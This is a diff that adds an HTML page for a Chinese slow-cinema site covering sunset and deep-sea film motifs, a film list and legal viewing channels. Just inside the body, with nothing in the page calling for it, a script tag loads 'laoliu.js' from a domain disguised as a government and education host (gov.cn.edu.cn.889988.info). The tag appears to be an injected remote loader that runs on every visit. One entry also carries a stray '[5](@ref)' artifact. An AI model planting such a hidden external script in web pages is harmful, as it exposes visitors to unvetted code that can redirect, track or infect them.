@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>沉落电影网 - 慢落体电影志·黄昏/深海/文艺片资料站</title>
+<meta name="description" content="沉落电影网(chenluodianyingwang-h5.github.io)是慢落体电影志：夕阳沉落、深海没入、精神低处与慢文艺片。影评、落日片单、沉没意象、正版观看入口。不存片、不播盗版，只陪你往下沉一点再看。">
+<meta name="keywords" content="沉落电影网, chenluodianyingwang-h5, 慢文艺片, 夕阳电影, 深海意象, 坠落电影, 沉沦与救赎片单">
+<meta name="author" content="沉落电影网">
+<meta name="robots" content="index, follow">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --night:#0c1320;
+  --night-2:#142033;
+  --sun:#e8794a;
+  --sun-soft:#f0a868;
+  --sea:#3f7d8c;
+  --sea-light:#7fb6c0;
+  --paper:#efe7d8;
+  --silver:#d8dee8;
+  --soft:#9fb0bd;
+  --line:rgba(216,222,232,.16);
+  --card:rgba(255,255,255,.04);
+  --radius:18px;
+  --shadow:0 12px 34px rgba(0,0,0,.4);
+}
+html{scroll-behavior:smooth}
+body{font-family:"Noto Serif SC","Songti SC","PingFang SC",serif;background:var(--night);color:var(--silver);line-height:1.85;overflow-x:hidden}
+.bg{position:fixed;inset:0;z-index:0;pointer-events:none;background:
+  radial-gradient(520px 360px at 82% 12%,rgba(232,121,74,.28),transparent 62%),
+  radial-gradient(620px 420px at 12% 88%,rgba(63,125,140,.26),transparent 60%),
+  linear-gradient(180deg,#0c1320 0%,#142033 55%,#0a1018 100%);}
+/* 水面波纹 */
+.water{position:fixed;left:0;right:0;bottom:0;height:38vh;z-index:0;pointer-events:none;
+  background:linear-gradient(180deg,transparent,rgba(63,125,140,.18) 60%,rgba(63,125,140,.34));
+  mask-image:repeating-linear-gradient(180deg,#000 0 2px,transparent 2px 7px);opacity:.5;animation:wave 9s ease-in-out infinite}
+@keyframes wave{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+/* 下沉粒子 */
+.sink{position:fixed;width:3px;height:3px;border-radius:50%;background:var(--sun-soft);z-index:0;opacity:.5;animation:fall 12s linear infinite}
+@keyframes fall{0%{transform:translateY(-10vh);opacity:0}20%{opacity:.7}100%{transform:translateY(110vh);opacity:0}}
+
+.topbar{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(12,19,32,.82);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1200px;margin:0 auto;padding:0 20px;height:60px;display:flex;align-items:center;justify-content:space-between}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:1.15rem}
+.brand .sun{width:34px;height:34px;border-radius:50%;background:radial-gradient(circle at 50% 40%,var(--sun-soft),var(--sun) 60%,#7a2f1c);box-shadow:0 0 18px rgba(232,121,74,.55)}
+.brand b{color:var(--sun-soft)}
+.topnav{display:flex;gap:4px}
+.topnav a{padding:8px 14px;border-radius:8px;font-size:.84rem;font-weight:600;color:var(--soft);transition:.25s}
+.topnav a:hover,.topnav a.active{background:rgba(232,121,74,.14);color:var(--sun-soft)}
+.menu-btn{display:none;background:none;border:none;font-size:1.4rem;color:var(--sun-soft);cursor:pointer}
+
+.hero{position:relative;z-index:1;margin-top:60px;padding:80px 20px 60px}
+.hero-inner{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1.1fr .9fr;gap:40px;align-items:center}
+.kicker{font-family:"Courier New",monospace;font-size:.68rem;letter-spacing:3px;color:var(--sun-soft);border:1px solid var(--line);padding:4px 10px;border-radius:20px}
+.hero h1{font-size:clamp(2rem,4.4vw,3.2rem);font-weight:900;line-height:1.16;margin:14px 0 8px}
+.hero h1 .set{color:var(--sun);text-shadow:0 8px 30px rgba(232,121,74,.35)}
+.hero h1 .deep{color:var(--sea-light)}
+.hero p{color:var(--soft);font-size:1rem;margin:14px 0 24px}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap}
+.btn{font-family:inherit;font-weight:700;font-size:.9rem;padding:12px 24px;border-radius:10px;cursor:pointer;border:none;transition:.3s}
+.btn-main{background:linear-gradient(135deg,var(--sun),#b8431f);color:#1a0d08}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 14px 40px rgba(232,121,74,.35)}
+.btn-line{background:transparent;border:2px solid var(--sea-light);color:var(--sea-light)}
+.hero-card{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:24px;box-shadow:var(--shadow)}
+.hero-card h3{font-size:.95rem;margin-bottom:10px;color:var(--sun-soft)}
+.hero-card p{font-size:.78rem;color:var(--soft);line-height:1.65}
+.hero-card .ok{color:var(--sea-light);font-weight:800}
+
+.container{max-width:1200px;margin:0 auto;padding:52px 20px;position:relative;z-index:1}
+.label{font-family:"Courier New",monospace;font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--sun-soft)}
+.title{font-size:clamp(1.3rem,3vw,1.8rem);font-weight:800;margin:4px 0 6px}
+.desc{font-size:.88rem;color:var(--soft);margin-bottom:30px}
+.divider{height:2px;background:repeating-linear-gradient(90deg,var(--sun-soft) 0 14px,transparent 14px 26px);opacity:.22;margin:8px 0 26px}
+
+/* 三种沉法 */
+.mode-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:20px}
+.mode{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:24px;transition:.3s;position:relative;overflow:hidden}
+.mode::after{content:"";position:absolute;left:0;right:0;bottom:0;height:60px;background:linear-gradient(180deg,transparent,var(--c,var(--sun)));opacity:.12}
+.mode:hover{transform:translateY(-4px);box-shadow:var(--shadow);border-color:var(--c,var(--sun))}
+.mode .ico{font-size:2.2rem}
+.mode h3{font-size:1.05rem;font-weight:800;color:#fff;margin:8px 0 6px}
+.mode p{font-size:.78rem;color:var(--soft);line-height:1.65}
+
+/* 落日片单 */
+.list{background:rgba(232,121,74,.06)}
+.film-row{display:grid;grid-template-columns:54px 1fr auto;gap:18px;align-items:center;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px 20px;margin-bottom:14px;transition:.3s}
+.film-row:hover{transform:translateX(6px);border-color:var(--sun-soft)}
+.film-no{font-size:1.5rem;font-weight:900;font-family:Georgia,serif;color:var(--sun-soft);text-align:center}
+.film-row h3{font-size:.95rem;font-weight:700;color:#fff}
+.film-row p{font-size:.74rem;color:var(--soft)}
+.film-tag{padding:6px 12px;border-radius:20px;font-size:.7rem;font-weight:700;background:rgba(127,182,192,.18);color:var(--sea-light);white-space:nowrap}
+
+/* 意象 */
+.motif-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:18px}
+.motif{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px}
+.motif h3{font-size:.95rem;color:#fff}
+.motif p{font-size:.76rem;color:var(--soft);margin-top:6px}
+.motif .eg{margin-top:8px;font-size:.72rem;color:var(--sun-soft);font-weight:600}
+
+/* 正版 */
+.watch-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:18px}
+.w{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px}
+.w h3{font-size:.95rem;color:#fff}
+.w p{font-size:.76rem;color:var(--soft);margin-top:6px}
+.w .tag{font-size:.7rem;color:var(--sea-light);font-weight:700;margin-top:8px;display:inline-block}
+
+.footer{position:relative;z-index:1;background:#080d16;color:var(--silver);padding:46px 20px 24px;margin-top:54px;border-top:1px solid var(--line)}
+.footer-inner{max-width:1200px;margin:0 auto}
+.footer-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;margin-bottom:26px}
+.footer h4{font-size:.9rem;margin-bottom:10px;color:#fff}
+.footer a{display:block;font-size:.8rem;color:var(--soft);padding:3px 0}
+.footer a:hover{color:var(--sun-soft)}
+.footer p{font-size:.82rem;color:var(--soft);line-height:1.6}
+.footer-bottom{text-align:center;font-size:.72rem;color:rgba(216,222,232,.5);padding-top:18px;border-top:1px solid rgba(216,222,232,.12)}
+.footer-bottom a{color:var(--sun-soft);font-weight:600;display:inline}
+
+@media(max-width:1024px){.hero-inner{grid-template-columns:1fr}.hero-card{order:-1}}
+@media(max-width:768px){
+  .topnav{display:none;position:absolute;top:60px;left:0;right:0;flex-direction:column;background:rgba(12,19,32,.97);padding:12px 20px;border-bottom:1px solid var(--line)}
+  .topnav.open{display:flex}.menu-btn{display:block}
+  .film-row{grid-template-columns:42px 1fr;gap:10px}.film-tag{grid-column:2;justify-self:start}
+  .footer-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:480px){.footer-grid{grid-template-columns:1fr}.hero h1{font-size:1.7rem}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<div class="bg"></div>
+<div class="water"></div>
+<script>
+for(var i=0;i<26;i++){var s=document.createElement('div');s.className='sink';
+s.style.left=Math.random()*100+'vw';s.style.animationDuration=(9+Math.random()*7)+'s';
+s.style.animationDelay=(-Math.random()*12)+'s';document.body.appendChild(s);}
+</script>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="brand"><span class="sun"></span>沉落<b>电影网</b></div>
+    <nav class="topnav" id="topNav">
+      <a href="#home" class="active">首页</a>
+      <a href="#modes">三种沉法</a>
+      <a href="#list">落日片单</a>
+      <a href="#motifs">沉落意象</a>
+      <a href="#watch">去哪看</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn">☰</button>
+  </div>
+</div>
+
+<section class="hero" id="home">
+  <div class="hero-inner">
+    <div>
+      <span class="kicker">SLOW FALL · DUSK & DEEP SEA CINEMA</span>
+      <h1>太阳<span class="set">沉落</span>进远山，<br>人也<span class="deep">沉进</span>电影里。</h1>
+      <p>沉落电影网（chenluodianyingwang-h5.github.io）不追热搜、不堆资源。它收那些“往下落”的片子：夕阳、深海、失语、迟来的告别、沉沦与自救。本站不托管视频、不解析盗版源，只做慢文艺片的落日志。</p>
+      <div class="hero-actions">
+        <button class="btn btn-main">🌅 进三种沉法</button>
+        <button class="btn btn-line">🌊 看沉落片单</button>
+      </div>
+    </div>
+    <div class="hero-card">
+      <h3>沉落三不</h3>
+      <p><span class="ok">✓</span> 不存片、不深度链接非法视听源<br>
+      <span class="ok">✓</span> 不把“沉落”做成情色/猎奇擦边<br>
+      <span class="ok">✓</span> 慢片、文艺片、作者片、纪录片为主<br>
+      <span class="ok">✓</span> 沉的是情绪，不是底线</p>
+    </div>
+  </div>
+</section>
+
+<div class="container" id="modes">
+  <div class="label">— THREE KINDS OF FALLING —</div>
+  <h2 class="title">三种沉法：坠落、沉没、沦落</h2>
+  <p class="desc">同样叫“沉落”，镜头语言完全不一样。</p>
+  <div class="divider"></div>
+  <div class="mode-grid">
+    <div class="mode" style="--c:var(--sun)"><div class="ico">🌅</div><h3>夕阳沉落</h3><p>天体下沉、昼变夜、人舍不得走。用长镜、暖调、逆光把“结束”拍成礼物。适合讲乡愁、晚年、告别。</p></div>
+    <div class="mode" style="--c:var(--sea-light)"><div class="ico">🌊</div><h3>沉入深海</h3><p>没入、窒息、回声、水压。冷青蓝与微距水泡，讲记忆怎么被淹、又被打捞。心理片最爱用。</p></div>
+    <div class="mode" style="--c:#c98b6b"><div class="ico">🕯️</div><h3>精神沦落</h3><p>不是堕落爽文，是慢慢滑下去：失业、失语、失爱、失眠。镜头不审判，只陪你坐到天亮。</p></div>
+  </div>
+</div>
+
+<div class="container list" id="list">
+  <div class="label">— DUSK PLAYLIST —</div>
+  <h2 class="title">落日片单：天一暗就该看这些</h2>
+  <p class="desc">不按评分，按“你愿意往下沉多深”。</p>
+  <div class="divider"></div>
+  <div class="film-row"><div class="film-no">01</div><div><h3>《海上钢琴师》</h3><p>船不走，人也不下船。夕阳里的钢琴声，是文明最后的礼貌。</p></div><div class="film-tag">夕阳/孤独</div></div>
+  <div class="film-row"><div class="film-no">02</div><div><h3>《坠入 The Fall》</h3><p>坠落是线索也是隐喻：特技演员与小女孩，在病房里把童话讲成救赎。[5](@ref)</p></div><div class="film-tag">坠落/童话</div></div>
+  <div class="film-row"><div class="film-no">03</div><div><h3>《海街日记》</h3><p>海边老房子、梅子酒、姐妹、慢信。沉落不是悲剧，是日子自己往下流。</p></div><div class="film-tag">慢文艺</div></div>
+  <div class="film-row"><div class="film-no">04</div><div><h3>《花样年华》</h3><p>走廊、旗袍、吴哥窟的洞。把“没发生”拍得比“发生”还重。</p></div><div class="film-tag">失语/情动</div></div>
+  <div class="film-row"><div class="film-no">05</div><div><h3>《四个春天》</h3><p>父母、饭桌、烟花、离别。记录片式的沉落，没有剧本却刀刀准。</p></div><div class="film-tag">纪录/家常</div></div>
+  <div class="film-row"><div class="film-no">06</div><div><h3>《地球最后的夜晚》</h3><p>3D长镜、贵州雨夜、记忆转圈。看完像从深水里浮上来，分不清睡了多久。</p></div><div class="film-tag">梦境/深海</div></div>
+</div>
+
+<div class="container" id="motifs">
+  <div class="label">— FALLING IMAGES —</div>
+  <h2 class="title">沉落意象词典</h2>
+  <p class="desc">拉片时看到这些，就是在看“沉”。</p>
+  <div class="motif-grid">
+    <div class="motif"><h3>夕阳入山</h3><p>时间句号。常配画外音、逆光剪影、没人动的远景。</p><div class="eg">例：丁玲写“太阳已在向西山沉落”</div></div>
+    <div class="motif"><h3>石子入水</h3><p>事件落下，涟漪比事件本身更长。声音设计关键。</p><div class="eg">例：静影沉璧、石沉大海</div></div>
+    <div class="motif"><h3>电梯/楼梯下行</h3><p>心理下沉的几何化。往下不等于去地狱，也可能去记忆。</p><div class="eg">例：心理片/悬疑片常用</div></div>
+    <div class="motif"><h3>潜入水下</h3><p>听觉闷掉、色彩变冷、字幕像气泡。观众被请进潜意识。</p><div class="eg">例：梦境段落、创伤回溯</div></div>
+    <div class="motif"><h3>灯一盏盏灭</h3><p>家庭、村庄、关系在退场。不喊疼，只关灯。</p><div class="eg">例：故乡题、老龄化题</div></div>
+    <div class="motif"><h3>字幕往下沉</h3><p>片尾不滚上去，而是沉下去。结束感＞总结感。</p><div class="eg">例：作者片片尾处理</div></div>
+  </div>
+</div>
+
+<div class="container" id="watch">
+  <div class="label">— WHERE TO WATCH —</div>
+  <h2 class="title">沉落片去哪合法看</h2>
+  <p class="desc">慢片常被删、被埋，反而更要走正版/档案渠道。</p>
+  <div class="watch-grid">
+    <div class="w"><h3>国内正版平台</h3><p>爱优腾芒 B 站的艺术片/纪录片/经典区，部分慢文艺片有正版上架。</p><span class="tag">会员/免费区</span></div>
+    <div class="w"><h3>1905 / 央视频</h3><p>官方正版经典国产片、纪录片，适合找“不吵的电影”。</p><span class="tag">官方免费</span></div>
+    <div class="w"><h3>公共领域档案</h3><p>老默片、实验片、1960s 前作者片：Internet Archive / Prelinger 合法拉片。</p><span class="tag">无版权障碍</span></div>
+    <div class="w"><h3>电影节/资料馆</h3><p>平遥、上影节、北影节、高校放映、官方频道：慢片常在这里先露面。</p><span class="tag">策展/限量</span></div>
+  </div>
+</div>
+
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div>
+        <div class="brand"><span class="sun"></span>沉落<b>电影网</b></div>
+        <p>沉落电影网（chenluodianyingwang-h5.github.io）是慢落体电影志：夕阳沉落、深海没入、精神沦落与慢文艺片资料站。不提供未授权播放，不聚合非法视听节目，只把“往下沉”的片子讲明白。</p>
+      </div>
+      <div><h4>栏目</h4><a href="#modes">三种沉法</a><a href="#list">落日片单</a><a href="#motifs">沉落意象</a><a href="#watch">正版入口</a></div>
+      <div><h4>片种</h4><a href="#">慢文艺</a><a href="#">作者片</a><a href="#">纪录片</a><a href="#">梦境/心理片</a></div>
+      <div><h4>说明</h4><a href="#">本站立场</a><a href="#">版权与引用</a><a href="#">隐私说明</a><a href="#">联系我们</a></div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2024 沉落电影网 (Chenluo Movie Network) - 慢落体电影志 · 夕阳/深海/文艺片</p>
+      <p>网站地址：<a href="https://chenluodianyingwang-h5.github.io">https://chenluodianyingwang-h5.github.io</a></p>
+      <p style="margin-top:6px;opacity:.6">影片信息来自公开资料；“沉落”仅作意象与片单主题，不涉及情色/盗版/猎奇导向。</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn'),topNav=document.getElementById('topNav');
+menuBtn.onclick=function(){topNav.classList.toggle('open')};
+topNav.querySelectorAll('a').forEach(function(a){a.onclick=function(){topNav.classList.remove('open')}});
+var secs=document.querySelectorAll('section[id],div[id]');
+addEventListener('scroll',function(){
+  var y=scrollY+80;
+  secs.forEach(function(s){
+    if(y>=s.offsetTop&&y<s.offsetTop+s.offsetHeight){
+      document.querySelectorAll('.topnav a').forEach(function(a){a.classList.remove('active')});
+      var l=document.querySelector('.topnav a[href="#'+s.id+'"]');
+      if(l)l.classList.add('active');
+    }
+  });
+});
+</script>
+</body>
+</html>
